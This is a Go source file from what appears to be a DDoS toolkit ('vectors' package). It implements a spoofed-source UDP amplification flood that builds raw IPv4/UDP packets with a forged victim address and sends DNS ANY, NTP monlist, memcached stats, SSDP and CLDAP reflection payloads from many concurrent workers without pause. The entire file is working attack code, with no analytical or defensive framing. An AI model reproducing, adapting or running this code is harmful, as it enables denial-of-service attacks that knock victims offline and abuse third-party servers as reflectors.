package vectors

import (
	"math/rand"
	"net"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"
)

type AmpType int

const (
	AmpDNS AmpType = iota
	AmpNTP
	AmpMemcached
	AmpSSDP
	AmpCLDAP
)

type UDPAmplifier struct {
	typ     AmpType
	srcIP   net.IP
	dstIP   net.IP
	dstPort uint16
	packets atomic.Uint64
	fd      int
}

func NewUDPAmplifier(typ AmpType, spoofSrc, reflector string, reflectorPort uint16) (*UDPAmplifier, error) {
	src := net.ParseIP(spoofSrc).To4()
	dst := net.ParseIP(reflector).To4()
	if src == nil || dst == nil {
		return nil, unix.EINVAL
	}
	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return nil, err
	}
	unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
	return &UDPAmplifier{typ: typ, srcIP: src, dstIP: dst, dstPort: reflectorPort, fd: fd}, nil
}

func (u *UDPAmplifier) payload() []byte {
	switch u.typ {
	case AmpDNS:
		return []byte{0x12,0x34,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
			0x03,105,115,99,0x03,111,114,103,0x00,0x00,0xff,0x00,0x01}
	case AmpNTP:
		return []byte{0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00}
	case AmpMemcached:
		return []byte("stats\r\n")
	case AmpSSDP:
		return []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n")
	case AmpCLDAP:
		return []byte{0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,0x02,
			0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,
			0x43,0x6c,0x61,0x73,0x73,0x30,0x00}
	}
	return nil
}

func (u *UDPAmplifier) buildPacketInto(buf []byte, payload []byte, rng *rand.Rand, sport uint16) int {
	udpLen := 8 + len(payload)
	ipLen := 20 + udpLen
	if len(buf) < ipLen {
		return 0
	}
	pkt := buf[:ipLen]
	pkt[0] = 0x45
	pkt[2] = byte(ipLen >> 8)
	pkt[3] = byte(ipLen)
	pkt[4] = byte(rng.Intn(65535) >> 8)
	pkt[5] = byte(rng.Intn(65535))
	pkt[8] = 64
	pkt[9] = 17
	copy(pkt[12:16], u.srcIP)
	copy(pkt[16:20], u.dstIP)

	var sum uint32
	for i := 0; i+1 < 20; i += 2 {
		sum += uint32(pkt[i])<<8 | uint32(pkt[i+1])
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	cs := ^uint16(sum)
	pkt[10] = byte(cs >> 8)
	pkt[11] = byte(cs)

	udp := pkt[20:]
	udp[0] = byte(sport >> 8)
	udp[1] = byte(sport)
	udp[2] = byte(u.dstPort >> 8)
	udp[3] = byte(u.dstPort)
	udp[4] = byte(udpLen >> 8)
	udp[5] = byte(udpLen)
	copy(udp[8:], payload)

	var usum uint32
	usum += uint32(u.srcIP[0])<<8 | uint32(u.srcIP[1])
	usum += uint32(u.srcIP[2])<<8 | uint32(u.srcIP[3])
	usum += uint32(u.dstIP[0])<<8 | uint32(u.dstIP[1])
	usum += uint32(u.dstIP[2])<<8 | uint32(u.dstIP[3])
	usum += 17
	usum += uint32(udpLen)
	for i := 0; i+1 < udpLen; i += 2 {
		usum += uint32(udp[i])<<8 | uint32(udp[i+1])
	}
	for usum>>16 != 0 {
		usum = (usum & 0xffff) + (usum >> 16)
	}
	ucs := ^uint16(usum)
	if ucs == 0 {
		ucs = 0xffff
	}
	udp[6] = byte(ucs >> 8)
	udp[7] = byte(ucs)

	return ipLen
}

func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
	if workers <= 0 {
		workers = runtime.NumCPU() * 8
		if workers < 16 {
			workers = 16
		}
	}

	dst := &unix.SockaddrInet4{Port: int(u.dstPort)}
	copy(dst.Addr[:], u.dstIP)

	payload := u.payload()
	if payload == nil {
		return
	}

	const pktCap = 256

	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(seed int64) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ seed))
			buf := make([]byte, pktCap)

			for {
				select {
				case <-stop:
					return
				default:
				}
				n := u.buildPacketInto(buf, payload, rng, uint16(rng.Intn(64511)+1024))
				if n == 0 {
					continue
				}
				err := unix.Sendto(u.fd, buf[:n], 0, dst)
				if err != nil {
					if seed == 0 {
						println("sendto err:", err.Error())
					}
					continue
				}
				u.packets.Add(1)
			}
		}(int64(w))
	}
	wg.Wait()
	unix.Close(u.fd)
}

func (u *UDPAmplifier) Packets() uint64 { return u.packets.Load() }
